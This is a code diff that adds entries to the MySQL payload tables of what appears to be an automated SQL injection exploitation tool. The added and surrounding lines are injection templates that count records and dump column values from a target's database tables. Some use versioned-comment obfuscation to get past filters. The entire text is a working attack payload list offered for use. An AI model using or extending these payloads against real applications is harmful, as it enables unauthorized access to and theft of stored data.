@@ -441,6 +441,7 @@ PAYLOADS_COLS_NAMES = {
 
 PAYLOADS_RECS_COUNT = {
     "MySQL": [
+        "(SELECT COUNT(*)FROM({tbl}))",
         "(SELECT COUNT(*)FROM({db}.`{tbl}`))",
         "(/*!50000SELECT*/+COUNT(/*!50000**/)/*!50000FROM*/(/*!50000{db}*/./*!50000`{tbl}`*/))",
         "(SELECT IFNULL(TABLE_ROWS, 0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})AND(TABLE_NAME={tbl}))",
@@ -455,6 +456,7 @@ PAYLOADS_RECS_COUNT = {
 
 PAYLOADS_RECS_DUMP = {
     "MySQL": [
+        "(SELECT CONCAT({col}) FROM {tbl} LIMIT 0,1)",
         "(SELECT MID((IFNULL(CAST({col} AS NCHAR),0x20)),1,54) FROM {db}.{tbl} LIMIT 0,1)",
         "(/*!50000SELECT*//**/CONCAT/**_**/(/*!50000{col}*/)/*!50000FROM*/(/*!50000{db}*/./*!50000`{tbl}`*/)LIMIT/**/0,1)",
         "(SELECT CONCAT_WS(0x28,{col})FROM({db}.`{tbl}`)LIMIT 0,1)",
